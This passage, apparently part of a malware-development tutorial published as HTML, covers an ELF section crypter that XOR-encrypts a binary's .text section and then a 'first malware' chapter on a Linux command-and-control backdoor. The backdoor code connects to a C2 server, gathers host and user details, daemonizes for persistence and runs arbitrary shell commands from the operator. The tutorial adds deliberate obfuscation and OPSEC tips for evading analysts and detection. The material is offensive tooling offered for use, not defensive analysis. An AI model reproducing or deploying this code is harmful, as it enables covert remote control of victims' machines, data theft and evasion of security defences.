+                printf("Address: %lx\n", shdr[i].sh_addr);
+                printf("Size: %lx\n", shdr[i].sh_size);
+                printf("Contents: ");
+                for (size_t j = 0; j < shdr[i].sh_size; j++) {
+                    printf("%02x ", mapped[shdr[i].sh_offset + j]);
+                }
+                printf("\n\n");
+            }
+        }
+    }
+    
+    int main(int argc, char *argv[]) {
+        if (argc != 2) {
+            fprintf(stderr, "Usage: %s &lt;binary_file&gt;\n", argv[0]);
+            return EXIT_FAILURE;
+        }
+    
+        int fd = open(argv[1], O_RDWR);
+        if (fd < 0) return EXIT_FAILURE;
+    
+        struct stat st;
+        if (fstat(fd, &st) < 0) {
+            close(fd);
+            return EXIT_FAILURE;
+        }
+    
+        size_t filesize = st.st_size;
+        unsigned char *mapped = mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+        if (mapped == MAP_FAILED) {
+            close(fd);
+            return EXIT_FAILURE;
+        }
+    
+        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mapped;
+        if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
+            fprintf(stderr, "Not a valid ELF file\n");
+            munmap(mapped, filesize);
+            close(fd);
+            return EXIT_FAILURE;
+        }
+    
+        print_text_section(mapped, ehdr);
+    
+        munmap(mapped, filesize);
+        close(fd);
+        return EXIT_SUCCESS;
+    }
+</span>
+
+Next, we navigate the ELF (Executable and Linkable Format) structure to locate specific sections within the binary, particularly the code segments we want to encrypt. We begin by reading the ELF header, which provides essential metadata such as the offsets and sizes of various sections. Using this information, we can iterate through the section table to identify relevant segments like .text and .rodata, which typically contain executable code and read-only data, respectively. By using the offsets from the section table, we can access the actual data and apply encryption algorithms like RC4 to protect the binary’s contents. Finally, we unmap the file and close the file descriptor to ensure all changes are saved and resources are freed properly.
+
+So, what we essentially have here is a small crypter, the RC4 algorithm is used to encrypt the .text and .rodata sections of the binary. These sections contain the executable code and some static data of the binary. After encryption, these sections will contain garbled instructions, causing the binary to crash if you attempt to execute it.
+
+Given that RC4 is a reversible XOR operation, running the crypter on the same binary a second time will apply the same XOR operation to the encrypted sections, effectively restoring the original content (decrypting it). 
+
+you know the: v' = v ⊕ k and v'' = v' ⊕ k = (v ⊕ k) ⊕ k = v. 
+
+This means that the value vv is restored after the second application of XOR with the same key.
+
+So, we need to inject a stub (a small piece of code) into the binary. This stub will run before the main code, decrypting the encrypted sections (.text and .rodata) when the binary is executed. After decryption, it will jump to the original entry point of the binary, allowing it to run normally.
+
+<span class="preformatted">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;elf.h&gt;
+
+#define KEY_MASK 0xD
+static char key[8] = "0xddd01";
+
+#define ERROR_EXIT(x) { perror(x); exit(1); }
+
+static int get_file_size(int fd) {
+    struct stat st;
+    fstat(fd, &st);
+    return st.st_size;
+}
+
+Elf64_Shdr *find_section(void *m, char *name) {
+    Elf64_Ehdr *hdr = m;
+    Elf64_Shdr *sec_hdrs = m + hdr->e_shoff;
+    char *strtab = m + sec_hdrs[hdr->e_shstrndx].sh_offset;
+    for (int i = 0; i < hdr->e_shnum; i++) 
+        if (!strcmp(strtab + sec_hdrs[i].sh_name, name)) 
+            return &sec_hdrs[i];
+    return NULL;
+}
+
+void xor_encrypt(unsigned char *data, int len) {
+    for (int i = 0; i < len; i++) 
+        data[i] ^= key[i & KEY_MASK];
+}
+
+void encode_file(char *filename) {
+    int fd = open(filename, O_RDWR);
+    if (fd < 0) ERROR_EXIT("open");
+
+    int size = get_file_size(fd);
+    unsigned char *mem = mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (mem == MAP_FAILED) ERROR_EXIT("mmap");
+
+    Elf64_Shdr *sec = find_section(mem, ".text");
+    
+    xor_encrypt(mem + sec->sh_offset, sec->sh_size);
+    *(int *)(mem + 0x09) = sec->sh_offset;
+    *(short *)(mem + 0x0d) = sec->sh_size;
+    
+    close(fd);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) { printf("Usage: %s &lt;binary&gt;\n", argv[0]); exit(1); }
+    encode_file(argv[1]);
+    return 0;
+}
+</span>
+
+In this crypter, we target a specific section (like .text) of the ELF file and encrypt its contents. The crypter doesn't use a specific global buffer but instead locates the .text section by its name and XORs its content with a predefined key. The encrypted instructions look corrupted and nonsensical when disassembled, just for show
+
+The crypter also stores the offset and size of the encrypted section in predefined locations within the ELF header. During execution, a decryption stub decrypts this section back into its original form in memory, allowing the program to run as intended.
+</p>
+
+<hr>
+
+<p>
+    5. Write Your First Malware 
+        "For beings of such ethereal beauty, they were maddeningly sly; they'd appraised our every move, 
+        lurking just beyond our perception" 
+                                    - H.P. Lovecraft
+
+So, it’s finally time to write our first piece of malware! We’ve covered a lot so far, Even I’ve been writing on the fly. Maybe, you’ve picked up some useful Information along the way. With all the concepts we’ve explored, it can be challenging, but I’ve tried to focus on the essentials. I’m sharing terms, techniques, and ideas to give you a solid basics to build on.
+
+Let’s return to the basics: malware, malware refers to software designed to cause harm. Despite the different names and types, they all share the same core purpose: causing damage. We refer to this as the payload. Here’s a general overview of what our malware structure will look like:
+
+<span class="preformatted">
+    int main(int argc, char ** argv) {
+        /* Run the payload */
+        load_run();
+        return 0;
+    }
+</span>
+
+So, the payload itself? Easy to detect and flag. That’s why we usually perform some kind of obfuscation on it, hiding it within legitimate code or employing some anti-analysis techniques. Remember Anti-Debug and Anti-Disassembler? maybe little manipulation and obfuscation tricks , but what will our malware actually do? First, we need the core component; the payload. To define what we’re going to accomplish, I thought about the best example to illustrate this. Here’s the design: we’ll set up a command-and-control (C2) server that sends host information about the victim machine. This will include an open command execution channel to the C2 server, giving us access to the victim's system.
+
+So, what is a C2? Well our malware need a way for COM or communication. a C&C server to perform that and various aspect as well such enumration, persistence and data exfiltration, In order to understand a Command and Control, we must first start by understanding the various components of a C2 server. Let’s start with the most essential component - The C2 Server itself. The C2 Server serves as a hub for agents to call back to. Agents will periodically reach out to the C2 server and wait for the operator’s commands.
+
+An agent is a program generated by the C2 framework that calls back to a listener on a C2 server. Most of the time, this agent enables special functionality compared to a standard reverse shell. Most C2 Frameworks implement pseudo commands to make the C2 Operator’s life easier.
+
+Listeners On the most basic level, a listener is an application running on the C2 server that waits for a callback over a specific port or protocol. Some examples of this are DNS, HTTP, and or HTTPS.
+
+Beacons A Beacon is the process of a C2 Agent calling back to the listener running on a C2 Server.
+
+<span class="preformatted">
+  +------------------+          +------------------+
+  |   C2 Server      |          |      Agent       |
+  |                  |          |                  |
+  | +--------------+ |          | +--------------+ |
+  | |   Listener   | |<---------| |  Callback    | |
+  | +--------------+ |          | +--------------+ |
+  | | Processor    | |<---------| | Task Exec    | |
+  | +--------------+ |          | +--------------+ |
+  | | Data Store   | |<---------| | Data Collect | |
+  | +--------------+ |          | +--------------+ |
+  +------------------+          +------------------+
+</span>
+
+The server has various sub-components such as the listener, processor, data store, and authentication/authorization. The agent includes features like callback handling, task execution, data collection, and communication modules, Now this usually used only for showcases purposes but advanced C2 frameworks can do much more than just running a couple of commands on the compromised device. Payloads or tools could be dropped, can be used for moving laterally, initiating multi-stage attacks and exfiltrating data, store the loot and so on ...
+
+Objective: Establish a simple C2 (Command and Control) backdoor for persistent remote access to a zombie machine.
+
+So, let’s begin with the malware itself and move towards the idea of code manipulation. I’m not talking about object-oriented programming here; this is more about function-level transformation to evade detection. Sometimes, putting too much effort into deep obfsucation is just not worth it: if your goal doesn't need a high success rate or if time’s short, you can easily throw something together that works out of the box, with no fancy protection, and use it as-is.
+
+First, let’s focus on the basics. We need to set up a connection with a remote C2 server, let the server run arbitrary shell commands on the infected machine, and ensure that the malware persists—reconnecting to the server if the connection is dropped. Additionally, we’ll collect and send basic system information (like OS, architecture, username, and hostname) to the C2.
+
+For all of this, you need to be comfortable with basic C programming, syscalls, and Linux socket programming. Once we get through the core, you’ll have everything you need in your toolkit. So let’s dive into the main components. We’re going to look at socket management, data handling, and command execution.
+
+<span class="preformatted">
+    int init() {
+        if (dSock) {
+            close(dSock); 
+            dSock = 0x0;
+        }
+        
+        dSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (dSock < 0) {
+            _exit(-1);
+        }
+        
+        int r = Timeout(dSock, 20);
+        return r;
+    }
+</span>
+
+This should look familiar. We create a TCP socket and attempt to connect to the C2 server using ipAddr and dPort. If the connection fails, we retry after a timeout. But here’s where things get interesting: we make the socket non-blocking, so we can keep our "malware" from stalling while waiting for the connection.
+
+<span class="preformatted">
+int Timeout(unsigned int sockfd, int timeout) {
+    struct sockaddr_in addr;
+    fd_set fdset; 
+    struct timeval tv;
+    int flags;
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(demonPort);
+    addr.sin_addr.s_addr = inet_addr(ipAddr);
+    
+    flags = fcntl(sockfd, F_GETFL);
+    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK); 
+    
+    FD_ZERO(&fdset); 
+    FD_SET(sockfd, &fdset); 
+    
+    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        if (errno == EINPROGRESS) {
+            tv.tv_sec = timeout;
+            tv.tv_usec = 0;
+            
+            if (select(sockfd + 1, NULL, &fdset, NULL, &tv) > 0) {
+                int error; 
+                socklen_t len = sizeof error;
+                if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &error, &len) == 0 && !error) {
+                    return 1; 
+                }
+            }
+            return -1; 
+        }
+        return -1; 
+    }
+
+    fcntl(sockfd, F_SETFL, flags & (~O_NONBLOCK)); 
+    return 1;
+}
+</span>
+
+We use O_NONBLOCK with fcntl() so that the select() syscall waits for the socket to become writable. If the connection succeeds, we revert the socket back to blocking mode, and boom—the malware starts communicating with the server.
+
+Once connected, the malware needs to handle incoming commands from the server. It also keeps the connection alive by sending periodic "Hi" messages if no commands are received within a given timeout period. Here’s how we handle that:
+
+
+<span class="preformatted">
+int recv(int sockfd, unsigned char *buffer, int buffSize) {
+    fd_set fdset;
+    struct timeval tv;
+    
+    memset(buffer, 0, buffSize);
+    
+    FD_ZERO(&fdset);
+    FD_SET(sockfd, &fdset);
+    
+    tv.tv_sec = 12;
+    tv.tv_usec = 0;
+    
+    if (select(sockfd + 1, &fdset, NULL, NULL, &tv) <= 0) {
+        sockPrintf(sockfd, "Hi");
+        return 0;
+    }
+    
+    int ret = recv(sockfd, buffer, buffSize, 0);
+    buffer[strcspn(buffer, "\n")] = 0x0;
+    return ret;
+}
+</span>
+
+The recv() function waits 12 seconds for a command. If nothing comes through, it sends a "Hi" to keep the connection alive. Straightforward, no? But no stealth yet, no traffic obfuscation. It’s just a simple heartbeat mechanism.
+
+<b>OPSEC : Proxy every remote action you can using SOCKS proxy</b>
+
+Now here’s a neat trick: daemon(1, 1). This detaches the process from the terminal and runs it silently in the background. We also call signal(SIGPIPE, SIG_IGN) to ignore broken pipe signals, so if the C2 server disconnects unexpectedly, the malware just keeps going, waiting for a chance to reconnect.
+
+    daemon(1, 1); 
+
+At this point, the malware is completely exposed. It’s pretty clear what we’re doing here. So, we need to introduce some obfuscation. We’ll start with pointer manipulation to make the code harder to follow. Forget about anti-debugging for now; first, let’s see how obfuscation and pointer manipulation hide the flow of control between different functions.
+
+Here’s an example where we manipulate pointers to parse the incoming command from the C2 server:
+
+<span class="preformatted">
+unsigned char *x4 = x3;
+if (*x4 == '!') {
+    unsigned char *x5 = x4 + 1;
+    while (*x5 != ' ' && *x5 != 0x0) x5++;
+    if (*x5 == 0x0) continue;
+    *(x5) = 0x0;
+    x5 = x4 + 1;
+    x4 = x4 + strlen(x5) + 2;
+}
+</span>
+
+We could just work directly on x3, which holds the command, but instead we create another pointer x4 that points to the same memory. if (*x4 == '!') checks if the command starts with !, which means it’s a command to the malware, not normal traffic. x5 = x4 + 1 moves the pointer ahead by one byte, and the while loop walks through the command until it hits a space or null terminator (0x0). This kind of jumping around with pointers makes the flow hard to follow for anyone reading the disassembly.
+
+<span class="preformatted">
+unsigned char *x9() {
+    z1 z2;  
+    pid_t z3;
+    int z4[2];  
+    char *z5 = (char *)malloc(1024);  
+    memset(z5, 0, 1024);
+    ...
+    return z5;
+}
+</span>
+
+Instead of clearly naming variables, z1 is used instead of something like host_machine, which would make sense as a struct holding system details like OS, architecture, and username. z5 is a pointer to a buffer used to hold the formatted output before sending it to the C2 server. By using dynamically allocated memory here, we avoid stack-based detection, and by renaming everything to meaningless symbols, we hide the purpose of the function.
+
+When gathering system information, the code directly calls low-level syscalls instead of using libc wrappers, for example:
+
+<span class="preformatted">
+    struct utsname sysinfo;
+    if (syscall(SYS_uname, &sysinfo) == 0) {
+    strncpy(z2.arch, sysinfo.machine, sizeof(z2.arch) - 1);
+} else {
+    strcpy(z2.arch, "unknown");
+}
+</span>
+
+This avoids leaving any libc function calls in the binary that might trigger pattern-matching in analysis tools. We use the SYS_uname syscall to fetch the machine architecture directly, and then copy it into our obfuscated z2.arch field.
+
+
+<span class="preformatted">
+    int fd = syscall(SYS_open, "/etc/os-release", O_RDONLY);
+if (fd >= 0) {
+    ssize_t bytes_read = syscall(SYS_read, fd, buffer, sizeof(buffer) - 1);
+    buffer[bytes_read] = 0x0;
+    syscall(SYS_close, fd);
+}
+</span>
+
+Instead of calling fopen() or fread(), the code uses SYS_open, SYS_read, and SYS_close directly. Why? Using syscalls instead of libc functions gives the malware more control and avoids any overhead. Plus, it makes it harder to understand the function’s intent at a glance, and it dodges potential detections based on common libc patterns.
+
+When capturing the username, we use pipes and fork to call whoami, redirecting its output to a pipe:
+
+<span class="preformatted">
+    syscall(SYS_pipe, z4);
+z3 = syscall(SYS_fork);
+if (z3 == 0) {
+    syscall(SYS_dup2, z4[1], STDOUT_FILENO);
+    syscall(SYS_execve, "/usr/bin/whoami", argv, envp);
+    _exit(127);
+}
+</span>
+
+
+The malware forks a new process with SYS_fork(), and the child runs whoami using SYS_execve. The output is captured in a pipe (z4) and read back by the parent process. This obfuscates the way the username is captured, making it less obvious than just calling getenv("USER").
+
+Now, let’s look at how the malware sends data back to the C2.
+
+
+
+<span class="preformatted">
+int x8(int x9, unsigned char *x10) {
+    unsigned char *x12 = (unsigned char *)malloc(2048);
+    memset(x12, 0, 2048);
+    strncpy(x12, x10, 2048);
+    x12[strlen(x12)] = '\n';
+    int x13 = send(x9, x12, strlen(x12), NOSIGNAL);
+    free(x12);
+    return x13;
+}
+</span>
+
+Here, we allocate a buffer (x12), format the message (x10), and send it over the socket using send(). NOSIGNALprevents the "agent" from crashing if the connection breaks. Again, everything is renamed to random, meaningless symbols, adding another layer of obfuscation.
+
+When it comes to receiving commands from the C2, the recv() has some basic retry logic built in:
+
+<span class="preformatted">
+    if (select(x12 + 1, &x15, NULL, &x15, &x16) <= 0) {
+        for (int x17 = 0; x17 < 5; x17++) {
+            x8(x12, "Hi There!");
+        }
+    }
+</span>
+
+The malware(agent) waits for incoming data on the socket with select(). If there’s a timeout, it sends a keep-alive message up to 5 times. This simple retry mechanism makes sure the connection stays alive, allowing the C2 to reconnect if something goes wrong.
+
+Finally, the main() function sets everything in motion, persistently trying to reconnect to the C2 server and handle commands:
+
+<span class="preformatted">
+    if (*x4 == '!') {
+        unsigned char *x5 = x4 + 1;
+        while (*x5 != ' ' && *x5 != 0x0) x5++;
+        *(x5) = 0x0;
+        x4 = x4 + strlen(x5) + 2;
+    }
+</span>
+
+Here, x4 is the buffer holding the received command, and x5 is a pointer used to walk through the string. This pointer arithmetic is all about obfuscation—making it harder to follow the flow of control. After parsing the command, the malware can run shell commands using popen() and send the output back to the C2.
+
+Commands like sh are executed with popen(), and the output is sent back to the C2 server via x8(). Throughout the code, memory manipulation is done using pointer arithmetic instead of array indexing, adding confusion. For instance, in x9(), the original buffer is manipulated in a roundabout way.
+
+    syscall(SYS_read, z4[0], z2.user, sizeof(z2.user) - 1);
+    z2.user[strcspn(z2.user, "\n")] = 0x0;
+
+Instead of simply working on z2.user, the code uses pointer-based reads and manual null-termination. This slows down anyone trying to reverse-engineer it.
+
+The key takeaway here is that naming and pointers are weaponized to make the code confusing. A security researcher will need to reverse these steps one by one, wasting time and increasing the difficulty of understanding the code’s flow.
+
+<span class="preformatted">
+    pid = vfork();
+if (!pid) {
+    if (*type == 'r') {
+        close(pipefds[0]);
+        dup2(pipefds[1], 1);
+    }
+    execl("/bin/sh", "sh", "-c", command, NULL);
+    _exit(127);
+}
+</span>
+
+Unlike fork(), vfork() is designed to be more efficient for creating child processes in certain situations. It doesn’t copy the entire process address space like fork() does. Instead, the parent process is blocked until the child process calls exec() or _exit(). This is perfect for malware where performance and minimal footprint are important, This syscall is used to replace the current process image with a new one. In this case, we’re using execl() to run a shell (/bin/sh) and execute a command. The malware is effectively launching a new shell process and running arbitrary commands sent by the C2 server.
+
+The use of pipes (pipefds[0], pipefds[1]) ensures that the output of the command is captured and can be sent back to the C2 server. dup2() redirects the standard output (file descriptor 1) to the write end of the pipe.
+
+We also Throughout the code, memory is dynamically allocated using malloc(). This is essential for handling variable-sized data like host information and commands
+
+    char *z5 = (char *)malloc(1024);
+    memset(z5, 0, 1024);
+
+This dynamically allocates a buffer of 1024 bytes and then clears it using memset(). The reason for doing this manually instead of using stack-allocated memory is that heap-based memory management can be more flexible and harder to track in memory analysis.
+
+By using heap allocation, the malware can generate large buffers that are persistent (unlike stack-based buffers that are destroyed when the function returns). Heap-allocated buffers are harder to track in memory dumps, and they give more room for manipulation.
+
+All long the way we interacted with syscalls and user space leads to frequent context switches. For instance, every time a syscall like recv() or send() is invoked, the system switches from user mode to kernel mode. In kernel mode,
+
+we’re using syscalls, pointer manipulation, to not only accomplish basic malware functions but also to make the code harder to n00b reverser. The low-level control provided by these techniques makes it much more difficult for analysts to track data as it flows through the malware.
+
+<b>OPSEC : Direct syscall execution can get caught, a better way is to mask your syscalls with nop instructions or avoid using syscall instruction</b>
+
+The end result? A more evasive piece of malware that performs the same basic functions, but with a much more cryptic internal structure. Let's test this out, see how it behaves, No log will be shown on the payload console; there is no need to inform the user that it has been compromised. On the server side, if everything works fine and a connection can be established, you will be able to see the information reported by the malware, which will be something like:
+
+<span class="preformatted">
+    # In a terminal
+    $ ./agent 
+
+    # In another terminal
+    $ ./c2 
+    Server listening on port 80...
+    Connected from 127.0.0.1
+    System Information:
+    ------------------------------
+    Operating System  : GNU/Linux
+    Hostname          : 0x00
+    Username          : 0x00
+    Architecture      : x86_64
+    Enter a command (or 'exit' to quit): sh
+    $ 
+    Enter a command (or 'exit' to quit): exit
+    Agent disconnected.
+</span>
+
+So far as you see, the agent is working and we receive successfully the info about the victim machine and we can also execute command, and have access even if the server is lost or something we can always just run C2 and connect, because of the daemon in background as long as the victim machine is running (I know, but you get the idea).
+
+While you may ask, "This is confusing! How am I supposed to copy this and make it work?" you don’t. The reason I didn’t post all the code and walk you through every step is so you can take what you’ve seen here and write your own version. Don’t copy my style. ;)
+
+Each function in this agent is written with obfuscation in mind using techniques like pointer manipulation, syscall-level control, and random naming to make analysis more difficult at least static analysis and we could also introduce more anti-analysis and evasion techniques later on.
+ 
+I’m going to end this here for now. Maybe we’ll come back with Part II, where we can dive into even more interesting stuff.
+
+─ Links & References ─────────────── 
+
+[0] https://github.com/0x00pf/programming4wannabes
+
+[1] https://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html
+
+[2] https://blog.f0b.org/2022/05/process-injection-on-linux-injecting-into-processes/
+
+[3] https://github.com/gerasdf/InsecureProgramming
+
+[4] https://venkivasamsetti.github.io/ebookworm.github.io/Books/cse/C Programming Language (2nd Edition).pdf
+
+[5] https://www.plantation-productions.com/Webster/www.artofasm.com/Linux/HTML/AoATOC.html
+
+[6] http://www.ouah.org/virus-writing-HOWTO/
+
+</p></body></html>
